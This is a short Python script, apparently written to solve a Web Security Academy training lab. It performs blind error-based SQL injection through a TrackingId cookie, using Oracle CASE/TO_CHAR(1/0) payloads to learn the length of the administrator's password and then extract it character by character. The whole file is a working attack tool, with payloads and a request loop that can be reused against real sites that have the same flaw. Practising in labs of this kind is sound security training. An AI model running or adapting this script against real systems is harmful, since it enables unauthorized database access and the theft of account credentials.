import requests

url = 'https://0a4500b703bde48e80490868002500d9.web-security-academy.net/filter?category=Lifestyle'
chararacter = 'abcdefghijklmnopqrstuvwxyz1234567890!@#$%^&*()'



def get_length():
    for i in range(1, 101):
        cookies = {
            'TrackingId': '0D16aG4nnURWADar',
            'session': 'qgludDiAZbhGH9TTNepAUvcdjCtJD25r'
        }

        payload = f"'|| (SELECT CASE WHEN (LENGTH((SELECT password FROM users WHERE username='administrator')) = {i})THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||'"

        cookies['TrackingId'] += payload

        response = requests.get(url, cookies=cookies)

        if response.status_code == 500:
            return i
        
        
def get_data(length):
    temp = ''
    for i in range(1,length+1):
        for char in (chararacter): 
            cookies = {
            'TrackingId': '0D16aG4nnURWADar',
            'session': 'qgludDiAZbhGH9TTNepAUvcdjCtJD25r'
            }       
            payload = f"'|| (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='administrator'),{i},1) = '{char}' )THEN TO_CHAR(1/0) ELSE NULL END FROM dual) ||'"
            cookies['TrackingId'] += payload
            response = requests.get(url, cookies=cookies)
            # if here post request then use request.post

            if response.status_code == 500:
                print(temp)
                temp += char
                break
    return temp
        

length = get_length()
print(f"Password length is: {length}")
print("Dumping data... please be patient.")
data = get_data(length)
print(f"password is {data}")
